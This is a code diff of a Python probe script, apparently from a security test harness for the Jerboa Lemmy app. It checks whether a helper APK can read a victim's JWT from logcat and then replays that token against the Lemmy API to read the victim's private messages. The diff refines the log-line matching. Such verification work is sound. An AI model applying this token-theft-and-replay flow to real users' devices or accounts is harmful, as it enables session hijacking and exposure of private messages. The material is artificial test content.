@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Probe: Jerboa — confidentiality (malicious_app).
-Isolated entry point for consolidated evaluation engine.
+Leak-to-use flow through a co-installed helper APK.
 """
 
 from __future__ import annotations
@@ -13,17 +13,22 @@ import uuid
 from pathlib import Path
 
 
-def _load_and_run():
-    parent = Path(__file__).resolve().parent.parent
+def _load_and_run() -> int:
+    parent = Path(__file__).resolve().parent
     if str(parent) not in sys.path:
         sys.path.insert(0, str(parent))
 
     from jerboa_probe_utils import (
+        get_attested_pids,
+        get_boot_time,
+        get_device_time_info,
         get_victim_jwt_from_db,
+        parse_threadtime_epoch,
+        parse_threadtime_line,
         run_helper_reproduction,
     )
 
-    impact, summary = False, {"score": 1, "vectors": {}}
+    summary = {"score": 1, "vectors": {}}
     victim_jwt = get_victim_jwt_from_db()
     if not victim_jwt:
         print(json.dumps(summary))
@@ -33,31 +38,41 @@ def _load_and_run():
         "alice_dm_secret", ""
     )
 
-    # V-002: Logcat token leakage with post-exploit API access
-    # The malicious-app path is app-level: the helper APK itself reads logcat
-    # and returns the exact log line that contains the victim JWT.
-    ipc_ok, log_line = run_helper_reproduction(
+    helper_ok, log_output = run_helper_reproduction(
         mode="read_logs",
         logcat_tag="LemmyAPI",
         logcat_pattern=victim_jwt,
         run_id=uuid.uuid4().hex,
     )
-    if ipc_ok and log_line:
-        try:
-            import requests
-
-            jwt_match = None
-            for line in reversed(log_line.splitlines()):
-                if victim_jwt not in line or "Bearer " not in line:
+    if helper_ok and log_output:
+        attested_pids = get_attested_pids()
+        boot_time = get_boot_time()
+        year, tzinfo = get_device_time_info()
+        leak_line = ""
+        for line in reversed(log_output.splitlines()):
+            prefix, pid, tag, msg, _ = parse_threadtime_line(line)
+            if not pid or pid not in attested_pids:
+                continue
+            if tag != "LemmyAPI":
+                continue
+            if victim_jwt not in msg and victim_jwt not in line:
+                continue
+            if year is not None and tzinfo is not None:
+                epoch = parse_threadtime_epoch(prefix or "", year, tzinfo)
+                if epoch is not None and epoch < boot_time:
                     continue
-                jwt_match = line.split("Bearer ", 1)[1].split()[0].strip("\"'")
-                break
-            if jwt_match:
+            leak_line = line
+            break
+
+        if leak_line:
+            try:
+                import requests
+
                 base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
                 response = requests.get(
                     f"{base_url}/api/v3/private_message/list",
                     params={"type_": "All", "limit": 20},
-                    headers={"Authorization": f"Bearer {jwt_match}"},
+                    headers={"Authorization": f"Bearer {victim_jwt}"},
                     timeout=10,
                 )
                 if response.status_code == 200:
@@ -65,14 +80,14 @@ def _load_and_run():
                     for pm in payload.get("private_messages", []):
                         message = pm.get("private_message", {}).get("content", "")
                         if expected_secret and expected_secret in message:
-                            impact = summary["vectors"]["V-002"] = True
+                            summary["vectors"]["V-002"] = True
+                            summary["score"] = 0
                             break
-        except Exception:
-            pass
+            except Exception:
+                pass
 
-    summary["score"] = 0 if impact else 1
     print(json.dumps(summary))
-    return 0 if impact else 1
+    return 0 if summary["score"] == 0 else 1
 
 
 if __name__ == "__main__":
